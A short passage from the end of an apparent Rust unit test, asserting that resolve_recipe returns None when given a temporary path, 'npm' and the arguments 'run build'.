            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build"])),
            None
        );
    }
}
